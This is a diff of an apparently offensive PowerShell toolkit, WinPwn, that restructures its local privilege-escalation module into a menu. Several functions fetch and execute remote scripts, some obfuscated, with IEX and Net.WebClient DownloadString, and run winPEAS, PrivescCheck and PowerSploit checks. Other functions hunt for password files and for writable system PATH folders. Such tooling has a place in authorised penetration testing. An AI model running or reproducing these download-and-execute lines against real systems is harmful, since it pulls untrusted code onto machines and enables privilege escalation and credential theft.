@@ -59,8 +59,7 @@ function dependencychecks
         if($systemRoleID -ne 1){
         
                 "       [-] Some features in this script need access to the domain. They can only be run on a domain member machine. Pwn some domain machine for them!`n"
-               
-                Read-Host "Type any key to continue .."
+                              
                    
         }
         
@@ -1665,18 +1664,10 @@ function sharphound
     Invoke-Sharp
 }
 
-function privescmodules
+function oldchecks
 {
-<#
-        .DESCRIPTION
-        All privesc scripts are executed here.
-        Author: @S3cur3Th1sSh1t
-        License: BSD 3-Clause
-    #>
-    #Privilege Escalation Phase
     $currentPath = (Get-Item -Path ".\" -Verbose).FullName
     pathcheck
-    
     IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/locksher.ps1')
     IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/UpPower.ps1')
     IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/GPpass.ps1')
@@ -1706,6 +1697,23 @@ function privescmodules
     proportioned >> $currentPath\Vulnerabilities\Sherlock_Vulns.txt
     if(Test-Path $currentPath\Vulnerabilities\Sherlock_Vulns.txt){ $out = Get-Content $currentPath\Vulnerabilities\Sherlock_Vulns.txt; $out}}
     catch{}
+}
+
+function itm4nprivesc
+{
+    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
+    pathcheck
+    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/IkeextCheck.ps1')
+    Invoke-IkeextCheck >> "$currentPath\Vulnerabilities\IkeExtVulnerable.txt"
+    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/Invoke-Privesc.ps1')
+    Invoke-PrivescCheck >> "$currentPath\LocalPrivEsc\PrivescCheck.txt"
+
+}
+
+function otherchecks
+{
+    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
+    pathcheck
     
     $groups = 'Users,Everyone,Authenticated Users'
     $arguments = $groups.Split(",")
@@ -1792,34 +1800,84 @@ function privescmodules
      if ($i -eq 0) { Write "Files not found."}
      else {$out = get-content $currentPath\LocalPrivEsc\Passwordfiles.txt; $out }
     
-    If (([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
-    Write-Warning "This script will not function with administrative privileges. Please run as a normal user."
-    Break
-}
-Write-Host -ForegroundColor Yellow 'Looking for Writable PATH variable folders:'
-#Credit here https://gist.github.com/wdormann/eb714d1d935bf454eb419a34be266f6f 
-$outfile = "acltestfile"
-set-variable -name paths -value (Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\Environment' -Name PATH).path.Split(";")
-Foreach ($path in $paths) {
-    Try {
-        [io.file]::OpenWrite("$path\$outfile").close()
-        Write-Warning "I can write to '$path'"
-	echo $path >> $currentPath\LocalPrivEsc\Writable_PATH_Variable_Folder.txt
-        $insecure = 1
+    If (([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) 
+    {
+        Write-Warning "This script will not function with administrative privileges. Please run as a normal user."
+        Break
     }
-    Catch {}
+    Write-Host -ForegroundColor Yellow 'Looking for Writable PATH variable folders:'
+    #Credit here https://gist.github.com/wdormann/eb714d1d935bf454eb419a34be266f6f 
+    $outfile = "acltestfile"
+    set-variable -name paths -value (Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\Environment' -Name PATH).path.Split(";")
+    Foreach ($path in $paths) 
+    {
+        Try {
+                [io.file]::OpenWrite("$path\$outfile").close()
+                Write-Warning "I can write to '$path'"
+	            echo $path >> $currentPath\LocalPrivEsc\Writable_PATH_Variable_Folder.txt
+                $insecure = 1
+            }
+            Catch {}
+    }
+    If ($insecure -eq 1) {
+        Write-Warning "Any directory above is in the system-wide directory list, but can also be written to by the current user."
+        Write-Host "This can allow privilege escalation." -ForegroundColor Red
+    } Else {
+        Write-Host "Looks good! No system path can be written to by the current user." -ForegroundColor Green
+    }
 }
-If ($insecure -eq 1) {
-  Write-Warning "Any directory above is in the system-wide directory list, but can also be written to by the current user."
-  Write-Host "This can allow privilege escalation." -ForegroundColor Red
-} Else {
-  Write-Host "Looks good! No system path can be written to by the current user." -ForegroundColor Green
+
+function winPEAS
+{
+    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
+    pathcheck
+    REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1 /f
+    invoke-expression 'cmd /c start powershell -Command {$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;IEX(New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-winPEAS.ps1'');Invoke-winPEAS -command '' ''}'
+    REG DELETE HKCU\Console\ /v VirtualTerminalLevel /f
 }
-    
-    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/IkeextCheck.ps1')
-    Invoke-IkeextCheck >> "$currentPath\Vulnerabilities\IkeExtVulnerable.txt"
-    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/Invoke-Privesc.ps1')
-    Invoke-PrivescCheck >> "$currentPath\LocalPrivEsc\PrivescCheck.txt"
+
+function privescmodules
+{
+<#
+        .DESCRIPTION
+        All privesc scripts are executed here.
+        Author: @S3cur3Th1sSh1t
+        License: BSD 3-Clause
+    #>
+    #Privilege Escalation Phase
+    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
+    pathcheck
+    @'
+             
+__        ___       ____                 
+\ \      / (_)_ __ |  _ \__      ___ __  
+ \ \ /\ / /| | '_ \| |_) \ \ /\ / | '_ \ 
+  \ V  V / | | | | |  __/ \ V  V /| | | |
+   \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_|
+   --> local Privilege Escalation checks
+'@
+        
+        do
+        {
+            Write-Host "================ WinPwn ================"
+            Write-Host -ForegroundColor Green '1. itm4n´s Invoke-PrivescCheck'
+            Write-Host -ForegroundColor Green '2. winPEAS! '
+            Write-Host -ForegroundColor Green '3. Powersploits privesc checks! '
+            Write-Host -ForegroundColor Green '4. All other checks! '
+            Write-Host -ForegroundColor Green '5. Exit. '
+            Write-Host "================ WinPwn ================"
+            $masterquestion = Read-Host -Prompt 'Please choose wisely, master:'
+            
+            Switch ($masterquestion) 
+            {
+                1{itm4nprivesc}
+                2{winPEAS}
+                3{oldchecks}
+                4{otherchecks}
+            }
+        }
+        While ($masterquestion -ne 5)  
+
 }
 
 function lazagnemodule
